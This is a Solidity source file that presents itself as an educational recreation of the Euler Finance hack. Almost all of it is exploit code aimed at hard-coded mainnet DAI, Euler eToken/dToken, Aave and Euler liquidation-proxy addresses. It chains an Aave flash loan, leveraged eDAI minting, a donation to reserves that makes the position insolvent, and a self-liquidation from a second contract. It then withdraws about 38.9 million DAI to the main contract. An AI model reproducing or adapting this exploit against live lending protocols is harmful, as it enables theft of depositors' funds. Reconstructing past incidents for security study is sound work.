// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// This smartcontract is used to recreate the Euler Finance Hack using DAI token For Educational Purposes Only.
interface Euler{

}
interface DAI{
    function balanceOf(address addr) external view returns(uint256);
    function approve(address guy, uint wad) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
}
interface EDAI{
    function deposit(uint subAccountId, uint amount) external;
    function mint(uint subAccountId, uint amount) external;
    function donateToReserves(uint subAccountId, uint amount) external;
    function withdraw(uint subAccountId, uint amount) external;
}
interface DDAI{
    function repay(uint subAccountId, uint amount) external;
}

interface AAVE{
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface PROXY{
    struct LiquidationOpportunity {
        uint repay;
        uint yield;
        uint healthScore;
        uint baseDiscount;
        uint discount;
        uint conversionRate;
    }
    function liquidate(address violator, address underlying, address collateral, uint repay, uint minYield) external;
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral) external returns (LiquidationOpportunity memory liqOpp);
}
contract LendContract{
address mainContractAddress;
   constructor(address _mainaddress){
mainContractAddress=_mainaddress;
    }
    DAI dai=DAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);
   EDAI edai= EDAI(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
   DDAI ddai=DDAI(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    AAVE aave=AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    function exp() public{
        liquidationContract liquidation_C=new liquidationContract(address(this),mainContractAddress);
          dai.balanceOf(address(this));
        dai.approve(address(euler),type(uint256).max);
        edai.deposit(0,20000000000000000000000000);
        edai.mint(0,200000000000000000000000000);
        ddai.repay(0,10000000000000000000000000);
        edai.mint(0,200000000000000000000000000);
        edai.donateToReserves(0,100000000000000000000000000);
        liquidation_C.exp();
    }
}
contract liquidationContract{
address lendcontractAddress;
address MainAddress;

DAI dai=DAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);
   EDAI edai= EDAI(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
   DDAI ddai=DDAI(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    PROXY proxy=PROXY(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    constructor(address _lendContractAddress,address _mainContractAddress){
lendcontractAddress=_lendContractAddress;
MainAddress=_mainContractAddress;
    }
    function exp() public{
        PROXY.LiquidationOpportunity memory s=PROXY.LiquidationOpportunity({
        repay:0,
        yield:0,
        healthScore:0,
        baseDiscount:0,
        discount:0,
        conversionRate:0
        });
        s=proxy.checkLiquidation(address(this),lendcontractAddress,address(dai),address(dai));
        proxy.liquidate(lendcontractAddress,address(dai),address(dai),s.repay,250000000000000000000000000);
        edai.withdraw(0,38900000000000000000000000);
        dai.transfer(address(MainAddress),38900000000000000000000000);
    }
}
contract Main {
    DAI dai=DAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    Euler euler=Euler(0x27182842E098f60e3D576794A5bFFb0777E025d3);
    AAVE aave=AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address owner; 
    address[] tokens;
    uint256[] nums1;
    uint256[] nums2;
    function excuteHack() public{
        tokens.push(address(dai));
        nums1.push(30000000000000000000000000);
        nums2.push(0);
        aave.flashLoan(address(this),tokens,nums1,nums2,address(this),hex"",0);
    }
    constructor(){
      owner =msg.sender;
    }
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        LendContract lendcontract=new LendContract(address(this));
        dai.approve(address(aave),type(uint256).max);
        dai.transfer(address(lendcontract),nums1[0]);
        lendcontract.exp();
        return true;
    }

    function Approvedai() public {
     dai.approve(address(owner),type(uint256).max);
    }
}
